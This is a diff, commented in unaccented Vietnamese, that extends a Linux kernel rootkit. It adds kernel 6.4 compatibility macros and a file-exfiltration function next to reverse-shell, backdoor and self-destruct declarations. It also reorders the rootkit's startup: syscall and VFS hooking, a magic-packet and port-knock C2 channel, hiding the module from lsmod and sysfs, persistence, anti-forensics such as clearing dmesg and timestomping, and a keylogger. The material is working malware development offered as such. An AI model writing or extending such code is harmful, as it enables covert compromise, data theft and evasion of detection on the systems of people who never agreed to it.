@@ -464,6 +464,18 @@ install:
 /* Kernel 6.2+ doi cach set CR0 — native_write_cr0 bi unexport.
  * Phai dung inline assembly truc tiep. */
 
+/* Kernel 6.4+: core_layout/init_layout REMOVED.
+ * Thay boi module->mem[MOD_TEXT], module->mem[MOD_RODATA], etc.
+ * Compat macros de code compile tren ca kernel cu va moi. */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
+  #include <linux/module.h>  /* MOD_TEXT, struct module_memory */
+  #define MOD_BASE(m) ((m)->mem[MOD_TEXT].base)
+  #define MOD_SIZE(m) ((m)->mem[MOD_TEXT].size)
+#else
+  #define MOD_BASE(m) ((m)->core_layout.base)
+  #define MOD_SIZE(m) ((m)->core_layout.size)
+#endif
+
 /* ──────────────────────────────────────────────────────────────
  * FUNCTION PROTOTYPES — Khai bao cho cac module files
  * ────────────────────────────────────────────────────────────── */
@@ -6116,6 +6128,7 @@ static bool check_port_knock(__be32 src_ip, u16 dest_port)
 /* Forward declarations cho functions defined later in this file */
 static void rk_spawn_reverse_shell(const char *c2_addr);
 static void rk_execute_command(const char *cmd);
+static void rk_exfiltrate_file(const char *filepath, __be32 dest_ip);
 static void rk_self_destruct(void);
 static void rk_activate_backdoor(__be32 authorized_ip);
 
@@ -11192,29 +11205,35 @@ Internals: kernel's do_init_module() goi mod->init() sau khi:
   3. Module struct da duoc add vao modules list
   4. Notifier chain MODULE_STATE_COMING da fire
 
-rk_init() PHAI init theo thu tu dependency:
-  1. Symbol resolution (can truoc TAT CA)
-     <- kallsyms_lookup_name() hoac kprobe trick de tim addresses
-     <- Neu fail o day, KHONG CO GI hoat dong duoc
+rk_init() PHAI init theo thu tu dependency (xem main.c):
+  1. Hooking (syscall/ftrace/kprobe) — core capability, fail = abort
+     <- Install hooks DAU TIEN de bat dau intercept ngay
      
-  2. Hooking infrastructure (can truoc hook registration)
-     <- Allocate trampolines, save original bytes/pointers
-     <- Phai xong truoc khi bat ky hook nao duoc install
+  2. VFS hooks — supplementary hiding cho directory listing
+     <- Can sau syscall hooks (co the depend on cung infrastructure)
      
-  3. Hiding (can truoc C2 --- an module truoc khi mo communication)
-     <- list_del() module khoi modules list
-     <- kobject_del() xoa khoi sysfs
-     <- AN TRUOC, lam moi thu khac SAU --- vi moi operation
-        tu day tro di deu co the bi observer thay
+  3. Network/Netfilter — magic packet, port knock, C2 receive
+     <- Can truoc hiding: neu netfilter init fail, module van
+        accessible de debug. Non-fatal failure allowed.
      
-  4. C2/Network (can hiding da active)
-     <- Netfilter hooks, magic packet handler
-     <- Luc nay module da hidden, network activity kho trace
+  4. Hiding — an module khoi lsmod/sysfs
+     <- SAU hooks + network: moi feature da active truoc khi an.
+        An TRUOC persistence/anti-forensics vi nhung operations
+        do co the trigger events (file I/O) — module da hidden
+        khi do nen kho trace nguoc.
      
-  5. Proc interface (cuoi cung --- control plane)
-     <- /proc entry cho operator control
-     <- Cuoi cung vi: (a) dependency on all subsystems,
-        (b) operator chi can control SAU KHI moi thu da chay
+  5. Integrity + Watchdog — self-protection
+     <- Can sau hiding (watchdog verify hidden state)
+     
+  6. Persistence — survive reboot
+     <- Can sau hiding (file operations should happen hidden)
+     
+  7. Anti-forensics — clear dmesg, timestomp
+     <- Gan cuoi: xoa moi traces tu cac buoc truoc
+     
+  8. LSM/Keylogger/Proc/Crypto — optional subsystems
+     <- Cuoi cung: optional features, proc = control plane
+        chi can hoat dong SAU KHI moi thu da chay
 
 Neu step N fails:
   -> cleanup steps 1..(N-1) theo thu tu NGUOC
